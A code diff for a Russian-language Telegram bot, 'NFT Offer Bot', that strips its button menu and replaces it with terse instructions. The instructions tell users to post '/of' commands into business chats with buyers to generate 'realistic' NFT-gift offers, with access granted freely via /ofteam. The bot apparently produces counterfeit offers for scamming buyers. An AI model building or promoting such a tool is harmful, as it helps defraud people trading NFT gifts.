@@ -52,15 +52,7 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
-# --- ФУНКЦИЯ ДЛЯ ГЛАВНОГО МЕНЮ ---
-def get_main_menu():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📖 Как создать оффер?", callback_data="menu_help")],
-        [InlineKeyboardButton(text="🌐 Языки", callback_data="menu_langs"), InlineKeyboardButton(text="💰 Валюты", callback_data="menu_currencies")],
-        [InlineKeyboardButton(text="🔑 Получить доступ", callback_data="menu_access")]
-    ])
-
-# --- КОМАНДЫ /start И /menu ---
+# --- СТАРТ С ТВОИМ ТЕКСТОМ ---
 @dp.message(CommandStart())
 @dp.message(Command("menu"))
 async def cmd_start(message: types.Message):
@@ -68,67 +60,19 @@ async def cmd_start(message: types.Message):
     ADMIN_ID = message.from_user.id 
     
     text = (
-        "👋 <b>Добро пожаловать в NFT Offer Bot!</b>\n\n"
-        "Здесь вы можете создавать реалистичные визуальные офферы для NFT-подарков.\n\n"
-        "<i>Выберите нужный раздел в меню ниже:</i>"
+        "<b>Как начать:</b>\n"
+        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
+        "<b>Как создать оффер:</b>\n"
+        "Отправь команду в деловой чат с покупателем:\n"
+        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
+        "<b>Примеры:</b>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
+        "<b>Валюты:</b> stars / gram\n"
+        "<b>Языки:</b> ru / en / ua / ar"
     )
-    await message.answer(text, reply_markup=get_main_menu(), parse_mode="HTML")
-
-# --- ОБРАБОТЧИКИ МЕНЮ ---
-@dp.callback_query(F.data == "menu_help")
-async def cb_menu_help(callback: types.CallbackQuery):
-    text = (
-        "<b>📖 Инструкция по созданию оффера:</b>\n\n"
-        "1. Подключите бота в «Автоматизацию чатов».\n"
-        "2. Отправьте команду в деловой чат:\n"
-        "<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
-        "<b>Пример:</b>\n"
-        "<code>/of https://t.me/nft/DurovsCap-1234 500 stars ru</code>"
-    )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
-
-@dp.callback_query(F.data == "menu_langs")
-async def cb_menu_langs(callback: types.CallbackQuery):
-    text = (
-        "<b>🌐 Доступные языки:</b>\n\n"
-        "🇷🇺 <code>ru</code> — Русский\n"
-        "🇬🇧 <code>en</code> — English\n"
-        "🇺🇦 <code>ua</code> — Українська\n"
-        "🇸🇦 <code>ar</code> — العربية (Арабский)\n\n"
-        "<i>Пример: /of ССЫЛКА 500 stars en</i>"
-    )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
-
-@dp.callback_query(F.data == "menu_currencies")
-async def cb_menu_currencies(callback: types.CallbackQuery):
-    text = (
-        "<b>💰 Доступные валюты:</b>\n\n"
-        "⭐ <code>stars</code> — Звёзды Telegram\n"
-        "💎 <code>gram</code> — Gram (TON)\n\n"
-        "<i>Пример: /of ССЫЛКА 10 gram ru</i>"
-    )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
-
-@dp.callback_query(F.data == "menu_access")
-async def cb_menu_access(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id in active_users:
-        await callback.answer("✅ Доступ уже активен. Можно отправлять оферы.", show_alert=True)
-    else:
-        active_users.add(user_id)
-        await callback.answer("✅ Доступ выдан. Теперь можно отправлять оферы.", show_alert=True)
-
-@dp.callback_query(F.data == "menu_back")
-async def cb_menu_back(callback: types.CallbackQuery):
-    text = (
-        "👋 <b>Добро пожаловать в NFT Offer Bot!</b>\n\n"
-        "Здесь вы можете создавать реалистичные визуальные офферы для NFT-подарков.\n\n"
-        "<i>Выберите нужный раздел в меню ниже:</i>"
-    )
-    await callback.message.edit_text(text, reply_markup=get_main_menu(), parse_mode="HTML")
+    await message.answer(text, parse_mode="HTML")
 
 # --- КОМАНДА /ofteam ---
 @dp.message(Command("ofteam"))
